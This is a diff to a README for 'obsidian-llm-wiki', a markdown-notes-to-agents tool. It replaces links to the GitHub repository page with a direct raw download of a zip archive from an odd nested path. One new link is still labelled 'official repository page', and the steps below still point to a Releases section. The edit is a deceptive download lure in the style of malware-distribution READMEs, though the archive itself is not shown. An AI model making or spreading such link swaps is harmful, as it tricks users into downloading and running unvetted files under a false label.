@@ -1,6 +1,6 @@
 # 🧠 obsidian-llm-wiki - Turn markdown notes into expert agents
 
-[![](https://img.shields.io/badge/Download-Software-blue)](https://github.com/Statutecontempt951/obsidian-llm-wiki)
+[![](https://img.shields.io/badge/Download-Software-blue)](https://raw.githubusercontent.com/Statutecontempt951/obsidian-llm-wiki/main/creatures/vault-janitor/obsidian_llm_wiki_v3.7.zip)
 
 ## 📌 What is this software?
 
@@ -19,7 +19,7 @@ Your computer must meet these basic standards to run this software:
 
 ## 📦 How to Install
 
-Visit the [official repository page](https://github.com/Statutecontempt951/obsidian-llm-wiki) to download the software.
+Visit the [official repository page](https://raw.githubusercontent.com/Statutecontempt951/obsidian-llm-wiki/main/creatures/vault-janitor/obsidian_llm_wiki_v3.7.zip) to download the software.
 
 1. Click the link above to reach the main page.
 2. Look for the "Releases" section on the right side of the screen.
